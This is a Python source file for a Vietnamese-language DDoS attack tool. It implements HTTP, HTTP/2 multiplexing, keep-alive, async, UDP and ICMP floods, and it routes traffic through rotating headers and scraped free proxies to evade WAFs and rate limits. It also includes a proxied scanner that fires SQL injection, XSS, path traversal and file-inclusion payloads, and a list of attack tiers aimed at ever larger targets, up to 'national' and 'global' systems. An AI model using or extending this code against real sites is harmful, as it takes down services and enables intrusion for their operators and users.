#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ©️ Quang Bảo 2025 - All Rights Reserved

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import json
import logging
from datetime import datetime
import socket
import ssl
import whois
import dns.resolver
from bs4 import BeautifulSoup
import hmac
import base64
import sys
import struct
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme
from rich.text import Text
from rich import print as rprint
from rich.layout import Layout
import uuid

# Attempt to import h2 for HTTP/2 support
try:
    import h2.connection
    import h2.config
    HTTP2_AVAILABLE = True
except ImportError:
    HTTP2_AVAILABLE = False
    rprint("[yellow][CẢNH BÁO] Không tìm thấy module 'h2'. Tấn công HTTP/2 sẽ bị vô hiệu hóa. Cài đặt bằng 'pip install h2'[/]")

# Initialize logging
logging.basicConfig(filename='baongu.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize rich console with theme
custom_theme = Theme({
    "info": "cyan",
    "warning": "yellow",
    "error": "red bold",
    "success": "green bold",
    "highlight": "bright_magenta",
})
console = Console(theme=custom_theme)

# Hacker-style ASCII banner
def display_banner():
    banner = Text("""
          ╔════════════════════════════════════╗
          ║   © Quang Bao 2025 - DDoS Tool     ║
          ║      Ultimate Attack System        ║
          ╚════════════════════════════════════╝
  Không giỏi, không tài, không sắc, không tiền, không tình
 """, style="success")
    console.print(Panel(banner, title="DDoS System", border_style="highlight"))

# File integrity check
EXPECTED_HASH = None

def check_file_integrity():
    global EXPECTED_HASH
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                console.print(f"[warning][HỆ THỐNG] Tạo mã băm mới: {file_hash}[/]")
                logging.info(f"New file hash generated: {file_hash}")
            elif file_hash != EXPECTED_HASH:
                console.print("[error][LỖI NGHIÊM TRỌNG] Tệp bị thay đổi! Thoát.[/]")
                logging.error("File integrity check failed: File modified!")
                exit(1)
    except Exception as e:
        console.print(f"[error][LỖI NGHIÊM TRỌNG] Kiểm tra tính toàn vẹn thất bại: {str(e)}[/]")
        logging.error(f"File integrity check failed: {str(e)}")
        exit(1)

# Clear screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Target selection effect with progress bar
def target_selection_effect(target_type):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[info]KHÓA MỤC TIÊU: {target_type.upper()}[/]", total=100)
        for i in range(0, 101, 25):
            progress.update(task, advance=25, description=f"[info]KHÓA MỤC TIÊU: {target_type.upper()} [{i}%]...[/]")
            time.sleep(0.3)
        progress.update(task, description=f"[success]MỤC TIÊU ĐÃ KHÓA: {target_type.upper()} [100%]![/]")

# Loading animation
def loading_animation(message, duration):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[info]{message}[/]", total=100)
        for i in range(0, 101, 25):
            progress.update(task, advance=25, description=f"[info]{message} [{i}%]...[/]")
            time.sleep(duration / 4)
        progress.update(task, description=f"[success]{message} [100%]![/]")

# User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

# Random headers for WAF bypass
def generate_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'identity']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'DNT': random.choice(['1', '0']),
    }

# Proxy pool management
PROXY_LIST = []
PROXY_LOCK = threading.Lock()

async def fetch_free_proxies():
    global PROXY_LIST
    proxy_api_urls = [
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
        'https://www.proxy-list.download/api/v1/get?type=http',
        'https://api.openproxylist.xyz/http.txt',
    ]
    proxies = []
    async with aiohttp.ClientSession() as session:
        for api_url in proxy_api_urls:
            try:
                async with session.get(api_url, timeout=10) as response:
                    if response.status == 200:
                        text = await response.text()
                        proxies.extend([f"http://{proxy.strip()}" for proxy in text.splitlines() if proxy.strip()])
                        logging.info(f"Fetched {len(proxies)} proxies from {api_url}")
            except Exception as e:
                console.print(f"[warning][PROXY] Failed to fetch proxies from {api_url}: {str(e)}[/]")
                logging.warning(f"Failed to fetch proxies from {api_url}: {str(e)}")
    
    # Validate proxies
    valid_proxies = []
    async def validate_proxy(proxy):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://httpbin.org/ip', proxy=proxy, timeout=5) as response:
                    if response.status == 200:
                        valid_proxies.append(proxy)
                        logging.info(f"Validated proxy: {proxy}")
        except Exception:
            logging.warning(f"Invalid proxy: {proxy}")
    
    tasks = [validate_proxy(proxy) for proxy in proxies[:100]]  # Limit to 100 to avoid overload
    await asyncio.gather(*tasks)
    
    with PROXY_LOCK:
        PROXY_LIST = valid_proxies
        console.print(f"[success][PROXY] Loaded {len(PROXY_LIST)} valid proxies[/]")
        logging.info(f"Loaded {len(PROXY_LIST)} valid proxies")

def get_random_proxy():
    with PROXY_LOCK:
        return random.choice(PROXY_LIST) if PROXY_LIST else None

# Random POST data
POST_DATA = {
    "key": random.randint(1, 9999999),
    "value": random.random(),
    "secret": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
    "token": hashlib.md5(str(time.time()).encode()).hexdigest(),
    "attack_vector": random.choice(["destroy", "obliterate", "annihilate"])
}

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []

# Validate URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: {e}")

# Save attack configuration for persistent mode
def save_attack_config(url, num_threads, requests_per_thread, target_type):
    config = {
        "url": url,
        "num_threads": num_threads,
        "requests_per_thread": requests_per_thread,
        "target_type": target_type,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open("persistent_attack.json", "w") as f:
            json.dump(config, f)
        console.print(f"[warning][HỆ THỐNG] Cấu hình tấn công liên tục đã lưu: {url}[/]")
        logging.info(f"Saved attack configuration: {url}")
    except Exception as e:
        console.print(f"[error][LỖI] Không thể lưu cấu hình tấn công: {str(e)}[/]")
        logging.error(f"Failed to save attack configuration: {str(e)}")

# Assess target security level
def assess_target_security(url):
    security_level = "TRUNG BÌNH"
    recommended_threads = 1000
    recommended_requests = 1000

    try:
        # Check HTTP headers for security indicators
        response = requests.head(url, headers=generate_random_headers(), timeout=5)
        headers = response.headers

        # Check for WAF or CDN presence
        waf_indicators = ['cloudflare', 'akamai', 'sucuri', 'incapsula']
        server = headers.get('Server', '').lower()
        cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)

        # Check for rate limiting
        rate_limit = 'X-RateLimit-Limit' in headers or response.status_code in (429, 403)

        # Check WHOIS information for domain age
        domain = urllib.parse.urlparse(url).hostname
        whois_info = whois.whois(domain)
        creation_date = whois_info.get('creation_date')
        if creation_date:
            if isinstance(creation_date, list):
                creation_date = creation_date[0]
            domain_age = (datetime.now() - creation_date).days
        else:
            domain_age = 0

        # Evaluate security level
        if cdn_waf_detected or rate_limit:
            security_level = "CAO"
            recommended_threads = 8000  # Increased for high-performance system
            recommended_requests = 3000
        elif domain_age > 365:
            security_level = "TRUNG BÌNH"
            recommended_threads = 4000
            recommended_requests = 1500
        else:
            security_level = "THẤP"
            recommended_threads = 1000
            recommended_requests = 800

        console.print(f"[info][HỆ THỐNG] Đánh giá bảo mật: {security_level}, Threads: {recommended_threads}, Requests: {recommended_requests}[/]")
        logging.info(f"Target security assessment: {security_level}, Threads: {recommended_threads}, Requests: {recommended_requests}")

    except Exception as e:
        console.print(f"[warning][HỆ THỐNG] Không thể đánh giá bảo mật: {str(e)}. Sử dụng giá trị mặc định.[/]")
        logging.warning(f"Failed to assess target security: {str(e)}")
        security_level = "TRUNG BÌNH"
        recommended_threads = 4000
        recommended_requests = 1500

    return security_level, recommended_threads, recommended_requests

# Enhanced Web Vulnerability Scanner
async def scan_vulnerabilities(url):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        # Check for SQL Injection
        try:
            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --", "' UNION SELECT NULL, NULL --"]
            for payload in sql_payloads:
                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), proxy=get_random_proxy(), timeout=5) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in ["sql syntax", "mysql", "database error", "syntax error"]):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "High",
                            "description": f"Potential SQL Injection vulnerability detected with payload: {payload}",
                            "recommendation": "Sanitize and validate all user inputs, use prepared statements."
                        })
                        logging.info(f"Detected SQL Injection vulnerability with payload: {payload}")
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] SQL Injection scan failed: {str(e)}[/]")
            logging.warning(f"SQL Injection scan failed: {str(e)}")

        # Check for Cross-Site Scripting (XSS)
        try:
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')"
            ]
            for payload in xss_payloads:
                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), proxy=get_random_proxy(), timeout=5) as response:
                    text = await response.text()
                    if payload in text or "alert('XSS')" in text:
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "Medium",
                            "description": f"Reflected XSS vulnerability detected with payload: {payload}",
                            "recommendation": "Encode all output, implement Content Security Policy (CSP)."
                        })
                        logging.info(f"Detected XSS vulnerability with payload: {payload}")
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] XSS scan failed: {str(e)}[/]")
            logging.warning(f"XSS scan failed: {str(e)}")

        # Check for CSRF
        try:
            async with session.get(url, headers=generate_random_headers(), proxy=get_random_proxy(), timeout=5) as response:
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                forms = soup.find_all('form')
                for form in forms:
                    if not form.find('input', {'name': lambda x: x and 'csrf' in x.lower()}):
                        vulnerabilities.append({
                            "type": "CSRF",
                            "severity": "Medium",
                            "description": f"Form at {form.get('action', 'unknown')} lacks CSRF token.",
                            "recommendation": "Implement CSRF tokens in all forms."
                        })
                        logging.info(f"Detected CSRF vulnerability in form: {form.get('action', 'unknown')}")
        except Exception as e:
            console.print(f"[warning][VULN SCAN] CSRF scan failed: {str(e)}[/]")
            logging.warning(f"CSRF scan failed: {str(e)}")

        # Check for Directory Traversal
        try:
            traversal_payloads = ["../../etc/passwd", "../config.php", "../../../windows/win.ini"]
            for payload in traversal_payloads:
                async with session.get(f"{url}?file={urllib.parse.quote(payload)}", headers=generate_random_headers(), proxy=get_random_proxy(), timeout=5) as response:
                    text = await response.text()
                    if any(indicator in text.lower() for indicator in ["root:", "[extensions]", "password"]):
                        vulnerabilities.append({
                            "type": "Directory Traversal",
                            "severity": "High",
                            "description": f"Potential Directory Traversal vulnerability detected with payload: {payload}",
                            "recommendation": "Validate and sanitize file paths, restrict access to sensitive directories."
                        })
                        logging.info(f"Detected Directory Traversal vulnerability with payload: {payload}")
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] Directory Traversal scan failed: {str(e)}[/]")
            logging.warning(f"Directory Traversal scan failed: {str(e)}")

        # Check for Local/Remote File Inclusion
        try:
            lfi_payloads = ["php://filter/convert.base64-encode/resource=index.php", "/etc/passwd"]
            for payload in lfi_payloads:
                async with session.get(f"{url}?include={urllib.parse.quote(payload)}", headers=generate_random_headers(), proxy=get_random_proxy(), timeout=5) as response:
                    text = await response.text()
                    if any(indicator in text.lower() for indicator in ["php", "root:", "base64"]):
                        vulnerabilities.append({
                            "type": "File Inclusion",
                            "severity": "Critical",
                            "description": f"Potential File Inclusion vulnerability detected with payload: {payload}",
                            "recommendation": "Disable allow_url_include, validate include paths."
                        })
                        logging.info(f"Detected File Inclusion vulnerability with payload: {payload}")
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] File Inclusion scan failed: {str(e)}[/]")
            logging.warning(f"File Inclusion scan failed: {str(e)}")

        # Check Server Headers
        try:
            async with session.get(url, headers=generate_random_headers(), proxy=get_random_proxy(), timeout=5) as response:
                server = response.headers.get('Server', '')
                x_powered_by = response.headers.get('X-Powered-By', '')
                if server or x_powered_by:
                    vulnerabilities.append({
                        "type": "Server Information Disclosure",
                        "severity": "Low",
                        "description": f"Server headers exposed: Server={server}, X-Powered-By={x_powered_by}",
                        "recommendation": "Disable unnecessary server headers."
                    })
                    logging.info(f"Detected Server Information Disclosure: Server={server}, X-Powered-By={x_powered_by}")
        except Exception as e:
            console.print(f"[warning][VULN SCAN] Server header scan failed: {str(e)}[/]")
            logging.warning(f"Server header scan failed: {str(e)}")

        # Check SSL/TLS Configuration
        try:
            parsed_url = urllib.parse.urlparse(url)
            if parsed_url.scheme == 'https':
                context = ssl.create_default_context()
                with socket.create_connection((parsed_url.hostname, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=parsed_url.hostname) as ssock:
                        cert = ssock.getpeercert()
                        cipher = ssock.cipher()
                        if cipher[1] in ['TLSv1.0', 'TLSv1.1', 'SSLv3']:
                            vulnerabilities.append({
                                "type": "Weak SSL/TLS Configuration",
                                "severity": "High",
                                "description": f"Outdated TLS version detected: {cipher[1]}.",
                                "recommendation": "Use TLS 1.2 or higher, disable deprecated protocols."
                            })
                            logging.info(f"Detected Weak SSL/TLS Configuration: {cipher[1]}")
                        if 'RSA' in cipher[0] and cert.get('subjectAltName', []):
                            vulnerabilities.append({
                                "type": "Weak SSL Cipher",
                                "severity": "Medium",
                                "description": f"Weak cipher suite detected: {cipher[0]}.",
                                "recommendation": "Use strong cipher suites (e.g., ECDHE)."
                            })
                            logging.info(f"Detected Weak SSL Cipher: {cipher[0]}")
        except Exception as e:
            console.print(f"[warning][VULN SCAN] SSL/TLS scan failed: {str(e)}[/]")
            logging.warning(f"SSL/TLS scan failed: {str(e)}")

    return vulnerabilities

# Display Vulnerability Report
def display_vulnerability_report(vulnerabilities):
    table = Table(title="BÁO CÁO LỖ HỔNG BẢO MẬT", style="info")
    table.add_column("Loại", style="highlight")
    table.add_column("Mức độ", style="warning")
    table.add_column("Mô tả")
    table.add_column("Khuyến nghị", style="success")
    for vuln in vulnerabilities:
        table.add_row(vuln["type"], vuln["severity"], vuln["description"], vuln["recommendation"])
    console.print(table)
    if not vulnerabilities:
        console.print("[success][VULN SCAN] Không phát hiện lỗ hổng nào![/]")
        logging.info("No vulnerabilities detected")
    else:
        console.print(f"[warning][VULN SCAN] Phát hiện {len(vulnerabilities)} lỗ hổng tiềm ẩn![/]")
        logging.warning(f"Detected {len(vulnerabilities)} vulnerabilities")
    Prompt.ask("[info]Nhấn Enter để trở về menu...[/]")

# Persistent attack process
def persistent_attack_process(url, requests_per_thread):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)
            start_time = time.time()
            if method == "GET":
                response = session.get(url, headers=headers, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=2)
            elif method == "POST":
                response = session.post(url, data=payload, headers=headers, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=2)
            else:
                response = session.head(url, headers=headers, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=2)
            response_time = (time.time() - start_time) * 1000
            with manager:
                global success_count, error_count, response_times
                if response.status_code in (429, 403, 522):
                    console.print(f"[error][LIÊN TỤC] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI[/]")
                    success_count += 1
                    logging.info(f"Persistent attack success: Status {response.status_code}, Proxy: {proxy}")
                else:
                    console.print(f"[warning][LIÊN TỤC] Tấn công: Mã trạng thái {response.status_code}[/]")
                    success_count += 1
                    logging.info(f"Persistent attack: Status {response.status_code}, Proxy: {proxy}")
                response_times.append(response_time)
        except Exception as e:
            console.print(f"[error][LIÊN TỤC] Tấn công thất bại: {str(e)}[/]")
            logging.error(f"Persistent attack failed: {str(e)}, Proxy: {proxy}")
            with manager:
                error_count += 1
        time.sleep(random.uniform(0.0001, 0.001))

# HTTP/2 Multiplexing attack
def http2_multiplexing_attack(url):
    if not HTTP2_AVAILABLE:
        console.print("[error][HTTP/2] Tấn công bị vô hiệu hóa: Chưa cài đặt module 'h2'[/]")
        logging.error("HTTP/2 attack disabled: 'h2' module not installed")
        return
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 443
    try:
        conn = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
        h2_conn = h2.connection.H2Connection()
        h2_conn.initiate_connection()
        conn.send(h2_conn.data_to_send())
        headers = {
            ':method': 'GET',
            ':path': '/',
            ':scheme': 'https',
            ':authority': host,
            'user-agent': random.choice(USER_AGENTS),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
        }
        while True:
            start_time = time.time()
            for stream_id in range(1, 100, 2):
                h2_conn.send_headers(stream_id, headers)
                conn.send(h2_conn.data_to_send())
            response = conn.getresponse()
            response.read()
            response_time = (time.time() - start_time) * 1000
            with manager:
                global success_count, error_count, response_times
                if response.status in (429, 403, 522):
                    console.print(f"[error][HTTP/2] Tấn công: Mã trạng thái {response.status} - MỤC TIÊU QUÁ TẢI[/]")
                    success_count += 1
                    logging.info(f"HTTP/2 attack success: Status {response.status}")
                else:
                    console.print(f"[warning][HTTP/2] Tấn công: Mã trạng thái {response.status}[/]")
                    success_count += 1
                    logging.info(f"HTTP/2 attack: Status {response.status}")
                response_times.append(response_time)
            time.sleep(0.001)
    except Exception as e:
        console.print(f"[error][HTTP/2] Tấn công thất bại: {str(e)}[/]")
        logging.error(f"HTTP/2 attack failed: {str(e)}")
        with manager:
            error_count += 1
    finally:
        conn.close()

# Keep-Alive + Pipelining attack
def keep_alive_pipelining_attack(url):
    session = requests.Session()
    headers = generate_random_headers()
    headers['Connection'] = 'keep-alive'
    headers['Keep-Alive'] = 'timeout=5, max=1000'
    proxy = get_random_proxy()
    while True:
        try:
            start_time = time.time()
            for _ in range(10):
                session.get(url, headers=headers, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=2)
            response = session.get(url, headers=headers, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=2)
            response_time = (time.time() - start_time) * 1000
            with manager:
                global success_count, error_count, response_times
                if response.status_code in (429, 403, 522):
                    console.print(f"[error][KEEP-ALIVE] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI[/]")
                    success_count += 1
                    logging.info(f"Keep-Alive attack success: Status {response.status_code}, Proxy: {proxy}")
                else:
                    console.print(f"[warning][KEEP-ALIVE] Tấn công: Mã trạng thái {response.status_code}[/]")
                    success_count += 1
                    logging.info(f"Keep-Alive attack: Status {response.status_code}, Proxy: {proxy}")
                response_times.append(response_time)
        except Exception as e:
            console.print(f"[error][KEEP-ALIVE] Tấn công thất bại: {str(e)}[/]")
            logging.error(f"Keep-Alive attack failed: {str(e)}, Proxy: {proxy}")
            with manager:
                error_count += 1
        time.sleep(0.001)

# Multiprocessing attack
def multiprocessing_attack(url, requests_per_process):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    for _ in range(requests_per_process):
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)
            start_time = time.time()
            if method == "GET":
                response = session.get(url, headers=headers, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=2)
            elif method == "POST":
                response = session.post(url, data=payload, headers=headers, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=2)
            else:
                response = session.head(url, headers=headers, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=2)
            response_time = (time.time() - start_time) * 1000
            with manager:
                global success_count, error_count, response_times
                if response.status_code in (429, 403, 522):
                    console.print(f"[error][ĐA TIẾN TRÌNH] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI[/]")
                    success_count += 1
                    logging.info(f"Multiprocessing attack success: Status {response.status_code}, Proxy: {proxy}")
                else:
                    console.print(f"[warning][ĐA TIẾN TRÌNH] Tấn công: Mã trạng thái {response.status_code}[/]")
                    success_count += 1
                    logging.info(f"Multiprocessing attack: Status {response.status_code}, Proxy: {proxy}")
                response_times.append(response_time)
        except Exception as e:
            console.print(f"[error][ĐA TIẾN TRÌNH] Tấn công thất bại: {str(e)}[/]")
            logging.error(f"Multiprocessing attack failed: {str(e)}, Proxy: {proxy}")
            with manager:
                error_count += 1
        time.sleep(0.001)

# Multiprocessing + Async attack
async def async_request(url, session):
    try:
        headers = generate_random_headers()
        proxy = get_random_proxy()
        start_time = time.time()
        async with session.get(url, headers=headers, proxy=proxy, timeout=2) as response:
            response_time = (time.time() - start_time) * 1000
            with manager:
                global success_count, error_count, response_times
                if response.status in (429, 403, 522):
                    console.print(f"[error][ĐA TIẾN TRÌNH+ASYNC] Tấn công: Mã trạng thái {response.status} - MỤC TIÊU QUÁ TẢI[/]")
                    success_count += 1
                    logging.info(f"Async attack success: Status {response.status}, Proxy: {proxy}")
                else:
                    console.print(f"[warning][ĐA TIẾN TRÌNH+ASYNC] Tấn công: Mã trạng thái {response.status}[/]")
                    success_count += 1
                    logging.info(f"Async attack: Status {response.status}, Proxy: {proxy}")
                response_times.append(response_time)
    except Exception as e:
        console.print(f"[error][ĐA TIẾN TRÌNH+ASYNC] Tấn công thất bại: {str(e)}[/]")
        logging.error(f"Async attack failed: {str(e)}, Proxy: {proxy}")
        with manager:
            error_count += 1

async def multiprocessing_async_attack(url, requests_per_process):
    connector = aiohttp.TCPConnector(limit=100)  # Optimized for high-performance system
    async with aiohttp.ClientSession(headers=generate_random_headers(), connector=connector) as session:
        for _ in range(requests_per_process // 10):
            tasks = [async_request(url, session) for _ in range(10)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.001)

def multiprocessing_async_wrapper(url, requests_per_process):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(multiprocessing_async_attack(url, requests_per_process))

# Layer 4 UDP Flood
def udp_flood_attack(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(1000):  # Limit iterations for performance
            payload = os.urandom(random.randint(64, 1400))
            sock.sendto(payload, (host, port))
            console.print(f"[error][UDP FLOOD] Gửi gói tin đến {host}:{port}[/]")
            logging.info(f"UDP Flood: Sent packet to {host}:{port}")
            time.sleep(0.0001)
    except Exception as e:
        console.print(f"[error][UDP FLOOD] Tấn công thất bại: {str(e)}[/]")
        logging.error(f"UDP Flood attack failed: {str(e)}")
        with manager:
            error_count += 1
    finally:
        sock.close()

# Layer 4 ICMP Flood
def icmp_flood_attack(host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(1)
        for _ in range(1000):  # Limit iterations for performance
            payload = os.urandom(60000)
            icmp_packet = struct.pack("!BBHHH", 8, 0, 0, 0, 0) + payload
            sock.sendto(icmp_packet, (host, 0))
            console.print(f"[error][ICMP FLOOD] Gửi gói tin ICMP đến {host}[/]")
            logging.info(f"ICMP Flood: Sent packet to {host}")
            time.sleep(0.0001)
    except PermissionError:
        console.print("[error][ICMP FLOOD] Lỗi: Cần quyền root để gửi gói tin ICMP[/]")
        logging.error("ICMP Flood: Root permission required")
    except Exception as e:
        console.print(f"[error][ICMP FLOOD] Tấn công thất bại: {str(e)}[/]")
        logging.error(f"ICMP Flood attack failed: {str(e)}")
        with manager:
            error_count += 1
    finally:
        sock.close()

# Optimized attack configurations for 16GB RAM system
TARGET_CONFIGS = [
    {"id": "1", "name": "basic", "threads": 500, "requests": 500, "desc": "Tấn công cơ bản", "level": "Thấp", "application": "Kiểm tra hệ thống nhỏ"},
    {"id": "2", "name": "medium", "threads": 1000, "requests": 1000, "desc": "Tấn công trung bình", "level": "Trung bình", "application": "Hệ thống vừa"},
    {"id": "3", "name": "strong", "threads": 2000, "requests": 1500, "desc": "Tấn công mạnh", "level": "Trung bình", "application": "Hệ thống trung bình"},
    {"id": "4", "name": "ultra", "threads": 4000, "requests": 2000, "desc": "Tấn công siêu mạnh", "level": "Trung bình-Cao", "application": "Mục tiêu bảo vệ tốt"},
    {"id": "5", "name": "infinite", "threads": 2000, "requests": 1500, "desc": "Tấn công vòng lặp", "level": "Trung bình-Cao", "application": "Tấn công liên tục"},
    {"id": "6", "name": "unlimited", "threads": 4000, "requests": 2000, "desc": "Tấn công vô hạn", "level": "Trung bình-Cao", "application": "Tấn công liên tục"},
    {"id": "7", "name": "overload", "threads": 6000, "requests": 2500, "desc": "Tấn công quá tải 429/403", "level": "Cao", "application": "Hệ thống giới hạn"},
    {"id": "8", "name": "blitz", "threads": 8000, "requests": 3000, "desc": "Tấn công chớp nhoáng 522", "level": "Cao", "application": "Gián đoạn kết nối"},
    {"id": "9", "name": "layer3_4", "threads": 8000, "requests": 4000, "desc": "Tấn công UDP tầng 3/4", "level": "Cao", "application": "Gián đoạn mạng"},
    {"id": "10", "name": "combined", "threads": 10000, "requests": 3500, "desc": "Tấn công đa kỹ thuật", "level": "Cao", "application": "Mục tiêu phức tạp"},
    {"id": "11", "name": "layer7", "threads": 10000, "requests": 3500, "desc": "Tấn công tầng 7", "level": "Cao", "application": "Quá tải web"},
    {"id": "12", "name": "multi_vector", "threads": 12000, "requests": 4000, "desc": "Tấn công đa vector", "level": "Rất Cao", "application": "Mục tiêu lớn"},
    {"id": "13", "name": "god", "threads": 12000, "requests": 2000, "desc": "Tấn công cấp thần", "level": "Rất Cao", "application": "Mục tiêu bảo mật cao"},
    {"id": "14", "name": "hyper", "threads": 15000, "requests": 2000, "desc": "Tấn công siêu tốc", "level": "Cực Cao", "application": "Hệ thống lớn"},
    {"id": "15", "name": "supra", "threads": 20000, "requests": 2000, "desc": "Tấn công tối cao", "level": "Cực Cao", "application": "Mục tiêu siêu lớn"},
    {"id": "16", "name": "pulsar", "threads": 25000, "requests": 2000, "desc": "Tấn công pulsar", "level": "Cực Cao", "application": "Hệ thống phân tán"},
    {"id": "17", "name": "quasar", "threads": 30000, "requests": 2000, "desc": "Tấn công quasar", "level": "Cực Cao", "application": "Hệ thống CDN"},
    {"id": "18", "name": "prime", "threads": 35000, "requests": 2000, "desc": "Tấn công prime", "level": "Cực Cao", "application": "Hệ thống tải cao"},
    {"id": "19", "name": "cosmic", "threads": 40000, "requests": 2000, "desc": "Tấn công cosmic", "level": "Cực Cao", "application": "Hệ thống lớn"},
    {"id": "20", "name": "ultima", "threads": 50000, "requests": 2000, "desc": "Tấn công tối thượng", "level": "Cực Cao", "application": "Hệ thống doanh nghiệp"},
    {"id": "21", "name": "nova", "threads": 50000, "requests": 2000, "desc": "Tấn công supernova", "level": "Cực Cao", "application": "Hệ thống tải lớn"},
    {"id": "22", "name": "titan", "threads": 10000, "requests": 2000, "desc": "Tấn công titan", "level": "Cực độ", "application": "Hệ thống siêu lớn"},
    {"id": "23", "name": "void", "threads": 60000, "requests": 2000, "desc": "Tấn công void", "level": "Cực độ", "application": "Mục tiêu siêu bền"},
    {"id": "24", "name": "abyss", "threads": 80000, "requests": 2000, "desc": "Tấn công abyss", "level": "Cực độ", "application": "Hệ thống quốc gia"},
    {"id": "25", "name": "omega", "threads": 100000, "requests": 2000, "desc": "Tấn công omega", "level": "Cực độ", "application": "Hệ thống siêu bảo mật"},
    {"id": "26", "name": "giga", "threads": 120000, "requests": 2000, "desc": "Tấn công giga", "level": "Tối đa", "application": "Hệ thống toàn cầu"},
